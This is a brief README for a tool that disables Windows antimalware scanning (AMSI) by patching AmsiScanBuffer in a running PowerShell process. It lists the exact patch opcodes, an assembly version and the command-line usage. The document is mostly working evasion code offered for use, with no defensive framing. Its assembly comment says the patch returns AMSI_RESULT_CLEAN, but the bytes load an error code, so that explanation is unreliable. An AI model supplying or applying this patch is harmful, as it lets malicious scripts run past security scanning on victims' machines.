# AMSIScanBufBypass
Memory Patching AMSIScanBuffer 

Patching the AmsiScanBuffer Method with the following opcodes - 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3

```asm 
mov eax,offset  (offset has AMSI_RESULT_CLEAN) 
ret
```

# Usage

```
Get processid of your target - tasklist | findstr powershell.exe

amsipatch.exe pid
```

![AMSI Bypass](image.PNG)

# Credits
[RastaMouse](https://twitter.com/_RastaMouse) for [ASBBypass.ps1](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass.ps1)
